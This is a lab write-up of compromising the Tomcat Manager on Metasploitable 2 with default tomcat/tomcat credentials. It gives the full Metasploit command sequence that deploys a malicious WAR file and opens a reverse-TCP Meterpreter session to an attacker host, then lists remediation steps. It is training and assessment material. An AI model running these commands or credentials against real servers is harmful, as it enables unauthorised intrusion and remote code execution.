## 📂 Tomcat Manager Deploy Exploitation (Metasploitable 2)

### 📌 Executive Summary

A critical-severity administrative security flaw was identified in the Apache Tomcat Manager Application running on the target host ($\text{192.168.56.101}$).

The Tomcat Manager interface was secured only by a common, default credential set ($\text{tomcat/tomcat}$), which allowed an unauthenticated attacker to bypass authorization. This led to the successful deployment of a malicious Java Web Archive ($\text{.war}$) file, granting the attacker a **Meterpreter session** and **Remote Code Execution (RCE)** on the system.

**Finding Severity: CRITICAL**

-----

### 🔬 Technical Details and Methodology

#### 1\. Reconnaissance and Service Discovery

Initial reconnaissance confirmed the presence of a web application server running on a non-standard port.

  * **Target IP:** `192.168.56.101`
  * **Service Found:** Apache Tomcat/Coyote JSP Engine
  * **Port:** $\text{TCP 8180}$

The **Tomcat Manager App** was found at `http://192.168.56.101:8180/manager/html`, exposing the application deployment interface.

#### 2\. Vulnerability Analysis: Weak Credentials

Access to the Manager App is restricted only by a username/password pair. The target was successfully compromised using a common default credential combination.

  * **Username:** $\text{tomcat}$
  * **Password:** $\text{tomcat}$
  * **Impact:** These credentials provide the necessary administrative role ($\text{manager-gui}$) to deploy new applications.

#### 3\. Exploitation (Remote Code Execution)

The Metasploit Framework was used to automate the payload generation, authentication, and deployment process. The payload chosen was **Meterpreter**, offering a highly functional interactive post-exploitation environment.

  * **Attacker IP (LHOST):** `192.168.56.102`

  * **Module Used:** `exploit/multi/http/tomcat\_mgr\_deploy`

  * **Metasploit Commands:**

    ```ruby
    msf6 > use exploit/multi/http/tomcat_mgr_deploy
    msf6 exploit(...) > set RHOSTS 192.168.56.101
    msf6 exploit(...) > set RPORT 8180
    msf6 exploit(...) > set USERNAME tomcat
    msf6 exploit(...) > set PASSWORD tomcat
    msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
    msf6 exploit(...) > set LHOST 192.168.56.102
    msf6 exploit(...) > run
    ```

#### 4\. Post-Exploitation (Meterpreter Session)

Successful exploitation resulted in a $\text{Meterpreter session}$ on the target. This session is superior to a standard command shell, allowing advanced tasks like privilege escalation, token manipulation, and memory analysis.

  * **Resulting Shell Command:** $\text{sysinfo}$
  * **Resulting Session:** $\text{Meterpreter session 1 opened}$

!Meterpreter session established

-----

### 🛡️ Remediation and Mitigation

This vulnerability is due to weak configuration, not a software bug, making the fix critical for any production environment.

1.  **Mandatory Credential Change:** The default $\text{tomcat}$ user credentials must be immediately changed to a strong, complex passphrase or the user account must be removed entirely from the $\text{tomcat-users.xml}$ file if not needed.
2.  **Manager App Access Control:** Restrict access to the $\text{/manager/html}$ interface using the Tomcat configuration to allow connections **only** from specific administrative IP addresses (e.g., jump boxes or localhost), preventing external access entirely.
3.  **Principle of Least Privilege:** Ensure the Tomcat service is **not** running as a high-privileged user (like $\text{root}$). Even if exploited, this limits the damage an attacker can inflict on the underlying operating system.

-----
